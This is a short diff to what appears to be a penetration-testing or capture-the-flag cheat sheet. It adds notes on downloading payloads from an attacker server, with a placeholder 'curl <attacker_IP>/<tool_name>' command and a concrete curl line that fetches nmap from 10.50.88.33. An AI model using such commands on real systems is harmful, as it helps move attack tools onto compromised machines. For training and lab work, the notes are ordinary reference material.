@@ -11,3 +11,12 @@ export TERM=xterm
 ```
 
 
+Make a list of commands to download payloads from the server 
+
+```
+curl <attacker_IP>/<tool_name> -o <out_name>
+```
+
+```
+curl 10.50.88.33/nmap -o nmap_sar
+```
